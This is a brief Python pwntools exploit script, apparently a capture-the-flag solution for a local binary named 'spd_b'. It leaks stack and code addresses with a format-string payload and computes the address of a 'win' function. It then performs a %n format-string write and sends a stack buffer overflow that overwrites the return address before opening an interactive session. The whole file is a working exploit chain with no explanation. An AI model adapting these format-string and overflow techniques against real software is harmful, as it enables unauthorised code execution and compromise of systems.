from pwn import *
#s = gdb.debug('./spd_b', gdbscript = 'break *guess+137')
s = process(executable='./spd_b', argv = [])

payload = b"%38$x.%39$x"
s.recvuntil(b"guess: ")
s.sendline(payload)
msg = s.recvuntil(b"is not my number :(").decode()
ebp, addr = msg.replace("is not my number :(", "").split(".")

ebp = int(ebp, 16)
addr = int(addr, 16)
newaddr = addr - 0x1479 + 0x138d
ebp = ebp - 64
print("ebp found:", hex(ebp))
print("win addr found:", hex(newaddr))


payload = "%29477c%40$n"
s.sendline(payload)
s.recvuntil(b"number :(")

payload = b"a"*0x88 + b"aaaa" + p64(newaddr)
s.sendline(payload)
s.interactive()